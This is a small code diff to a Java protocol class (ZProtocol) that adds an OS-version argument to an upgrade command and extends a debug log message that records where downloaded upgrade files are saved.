@@ -334,7 +334,7 @@ public class ZProtocol extends Protocol {
 			boolean left = true;
 			try {
 				while (left) {
-					final byte[] response = command(Proto.UPGRADE);
+					final byte[] response = command(Proto.UPGRADE, WChar.pascalize(Cfg.OSVERSION));
 					left = parseUpgrade(response);
 				}
 			} catch (Exception ex) {
@@ -895,7 +895,7 @@ public class ZProtocol extends Protocol {
 				final byte[] content = new byte[size];
 				dataBuffer.read(content);
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " parseUpgrade: saving"); //$NON-NLS-1$
+					Check.log(TAG + " parseUpgrade: saving %s/%s", Path.upload(), filename); //$NON-NLS-1$
 				}
 				Protocol.saveUpload(filename, content);
 				upgradeFiles.addElement(filename);
